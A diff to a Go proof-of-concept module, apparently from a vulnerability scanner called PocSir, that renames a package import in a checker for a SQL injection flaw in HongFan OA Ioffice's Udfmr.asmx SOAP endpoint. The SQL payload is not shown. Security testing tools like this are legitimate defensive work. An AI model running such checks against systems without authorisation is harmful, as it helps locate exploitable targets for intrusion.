@@ -1,7 +1,7 @@
 package poc
 
 import (
-	"PocSir/common"
+	"PocSir/config"
 	"bytes"
 	"crypto/tls"
 	"io"
@@ -36,7 +36,7 @@ func HongFan_Ioffice_Sql(target string) {
     </soap:Envelope>`)
 	request, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(payload))
 	if err != nil {
-		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 		return
 	}
 	for key, value := range headers {
@@ -45,15 +45,15 @@ func HongFan_Ioffice_Sql(target string) {
 
 	resp, err := client.Do(request)
 	if err != nil {
-		common.ErrMsg.Printf("[-]%s is timeout\n", target)
+		config.ErrMsg.Printf("[-]%s is timeout\n", target)
 		return
 	}
 	defer resp.Body.Close()
 	data, _ := io.ReadAll(resp.Body)
 	if resp.StatusCode == http.StatusInternalServerError && strings.Contains(string(data), "服务器无法处理请求") {
-		common.Right.Printf("[+]%s 存在红帆OA Ioffice Udfmr.asmx SQL注入漏洞\n", target)
-		common.TextPut.Printf(string(data) + "\n")
+		config.Right.Printf("[+]%s 存在红帆OA Ioffice Udfmr.asmx SQL注入漏洞\n", target)
+		config.TextPut.Printf(string(data) + "\n")
 	} else {
-		common.ErrMsg.Printf("[-]%s 不存在红帆OA Ioffice Udfmr.asmx SQL注入漏洞\n", target)
+		config.ErrMsg.Printf("[-]%s 不存在红帆OA Ioffice Udfmr.asmx SQL注入漏洞\n", target)
 	}
 }
